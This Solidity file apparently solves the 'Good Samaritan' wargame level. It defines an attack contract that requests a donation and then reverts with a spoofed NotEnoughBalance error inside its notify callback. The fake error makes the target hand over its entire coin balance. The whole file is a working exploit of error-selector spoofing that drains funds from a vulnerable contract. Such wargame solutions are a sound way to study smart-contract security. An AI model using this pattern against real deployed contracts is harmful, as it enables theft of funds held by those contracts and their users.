// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract AttackOnGoodSamaritan {
    GoodSamaritan private immutable goodSamaritan;
    Coin private immutable coin;

    error NotEnoughBalance();

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
        coin = Coin(goodSamaritan.coin());
    }

    function Attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        }

    }


}
